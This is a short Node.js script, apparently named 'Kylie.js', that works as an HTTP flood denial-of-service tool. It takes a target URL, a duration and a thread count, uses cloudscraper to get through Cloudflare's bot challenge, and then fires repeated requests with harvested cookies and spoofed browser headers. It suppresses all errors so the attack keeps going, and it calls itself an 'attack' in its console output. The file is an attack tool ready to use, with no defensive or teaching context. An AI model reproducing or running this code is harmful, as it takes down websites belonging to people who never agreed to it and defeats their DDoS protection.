const cloudscraper = require('cloudscraper');
const request = require('request');
const args = process.argv.slice(2);

process.on('uncaughtException', () => { "Hi" });
process.on('unhandledRejection', () => { "Hi" });

if (process.argv.length <= 2) {
    console.log(`[Usage] node Kylie.js <url> <time> <threads>`);
    console.log(`[Example] node Kylie.js example.com 60`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

const url = process.argv[2]
const time = Number(process.argv[3])
const threads = Number(process.argv[4]) || 1;

console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);

for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        cloudscraper.get(url, function (e, r, b) {
            if (e) return;
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            const ip = rIp();
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Cache-Control': 'max-age=0',
                    'sec-ch-ua': 'Chromium";v="100", "Google Chrome";v="100"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin:',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Connection': 'Keep-Alive'
                }
            });
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);

}